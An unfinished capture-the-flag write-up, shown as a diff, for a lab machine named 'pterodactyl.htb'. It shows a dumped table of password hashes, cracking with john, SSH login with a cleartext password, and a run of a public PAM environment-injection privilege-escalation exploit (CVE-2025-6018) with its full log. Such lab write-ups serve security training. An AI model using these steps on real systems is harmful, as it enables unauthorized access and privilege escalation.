@@ -137,7 +137,7 @@ id      username        email   password
 2       headmonitor     headmonitor@pterodactyl.htb     $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
 3       phileasfogg3    phileasfogg3@pterodactyl.htb    $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi```
 
-This is is great. We got some credentials
+This is is great. We got some creadentials
 
 Let's crack it with john
 
@@ -161,4 +161,74 @@ phileasfogg3@pterodactyl:~> id
 uid=1002(phileasfogg3) gid=100(users) groups=100(users)
 ```
 
+Ok great we got ssh access to the machine and we can read the user.txt. Now we just have to find a way to escalate our privileges.
 
+I imported linpeas over to automate the enumeration.
+
+```bash
+phileasfogg3@pterodactyl:~> rpm -qi pam | grep Version
+Version     : 1.3.0
+```
+
+https://www.exploit-db.com/exploits/52386
+```bash
+# Exploit Title: Linux PAM Environment - Variable Injection Local Privilege Escalation
+# Description: PAM pam_env.so module allows environment variable injection via ~/.pam_environment
+#              leading to privilege escalation through SystemD session manipulation
+```
+
+This epxloit takes usage
+of the fact that
+```bash
+local graphical sessions → trusted
+remote SSH sessions → less trusted
+```
+Let's run the PAM poisoning script
+
+```bash
+python3 52386.py -i pterodactyl.htb -u phileasfogg3 -p '!QAZ2wsx'
+2026-05-02 12:22:32 [WARNING] Use only with proper authorization!
+2026-05-02 12:22:32 [INFO] Starting CVE-2025-6018 exploit against pterodactyl.htb:22
+2026-05-02 12:22:32 [INFO] Connecting to pterodactyl.htb:22 as phileasfogg3
+2026-05-02 12:22:33 [INFO] Connected (version 2.0, client OpenSSH_9.6)
+2026-05-02 12:22:33 [INFO] Authentication (publickey) failed.
+2026-05-02 12:22:33 [INFO] Authentication (publickey) failed.
+2026-05-02 12:22:33 [INFO] Authentication (password) successful!
+2026-05-02 12:22:33 [INFO] SSH connection established
+2026-05-02 12:22:33 [INFO] Starting vulnerability assessment
+2026-05-02 12:22:33 [INFO] Executing check: pam_version
+2026-05-02 12:22:33 [INFO] Vulnerable PAM version detected: pam-1.3.0
+2026-05-02 12:22:34 [INFO] Executing check: pam_env
+2026-05-02 12:22:34 [INFO] pam_env.so configuration found
+2026-05-02 12:22:34 [INFO] Executing check: pam_systemd
+2026-05-02 12:22:35 [INFO] pam_systemd.so found - escalation vector available
+2026-05-02 12:22:35 [INFO] Executing check: systemd_version
+2026-05-02 12:22:36 [INFO] Target appears vulnerable, proceeding with exploitation
+2026-05-02 12:22:36 [INFO] Creating malicious environment file
+2026-05-02 12:22:36 [INFO] Writing .pam_environment file
+2026-05-02 12:22:36 [INFO] Malicious environment file created successfully
+2026-05-02 12:22:36 [INFO] Reconnecting to trigger PAM environment loading
+2026-05-02 12:22:38 [INFO] Connected (version 2.0, client OpenSSH_9.6)
+2026-05-02 12:22:38 [INFO] Authentication (publickey) failed.
+2026-05-02 12:22:38 [INFO] Authentication (publickey) failed.
+2026-05-02 12:22:39 [INFO] Authentication (password) successful!
+2026-05-02 12:22:39 [INFO] Reconnection successful
+2026-05-02 12:22:39 [INFO] Testing privilege escalation vectors
+2026-05-02 12:22:39 [INFO] Testing: SystemD Reboot
+2026-05-02 12:22:39 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Reboot
+2026-05-02 12:22:39 [INFO] Testing: SystemD Shutdown
+2026-05-02 12:22:39 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Shutdown
+2026-05-02 12:22:39 [INFO] Testing: PolicyKit Check
+2026-05-02 12:22:39 [INFO] No escalation detected: PolicyKit Check
+2026-05-02 12:22:39 [INFO] EXPLOITATION SUCCESSFUL - Privilege escalation confirmed
+2026-05-02 12:22:39 [INFO] Starting interactive shell session
+
+--- Interactive Shell ---
+Commands: 'exit' to quit, 'status' for privilege check
+exploit$ id
+id
+uid=1002(phileasfogg3) gid=100(users) groups=100(users)
+```
+
+
+___________________NOT FINISHED_____________________
